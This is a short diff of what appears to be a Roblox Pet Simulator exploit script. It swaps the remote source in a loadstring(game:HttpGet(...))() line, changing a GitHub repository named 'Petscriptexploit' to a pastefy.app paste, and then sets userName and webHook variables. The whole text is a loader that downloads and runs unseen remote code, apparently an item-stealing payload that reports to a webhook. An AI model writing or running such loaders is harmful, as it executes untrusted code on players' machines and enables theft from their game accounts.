@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/PetsimScript/refs/heads/main/message%20(1)%20(1)-1%20(1).txt"))()
+loadstring(game:HttpGet("https://pastefy.app/O4K72yTX/raw"))()
 wait(0.1)
 userName = userName
 webHook = webHook
